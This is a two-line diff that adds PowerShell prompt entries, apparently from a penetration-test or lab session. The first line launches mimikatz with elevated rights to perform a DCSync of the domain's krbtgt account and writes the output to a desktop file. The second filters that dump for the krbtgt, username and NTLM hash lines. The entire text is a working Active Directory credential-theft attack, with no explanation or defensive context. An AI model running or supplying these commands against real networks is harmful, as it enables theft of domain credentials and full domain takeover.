@@ -1,0 +1,2 @@
+PS C:\Users\jeffadmin> Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile", "-Command", { & \tools\mimikatz '"lsadump::dcsync /user:corp\krbtgt" "exit"' > $env:USERPROFILE\Desktop\dump.txt }
+PS C:\Users\jeffadmin> (Get-Content $env:USERPROFILE\Desktop\dump.txt) | Where-Object { $_ -match '(krbtgt|Username|NTLM)' } | Select-Object -Unique
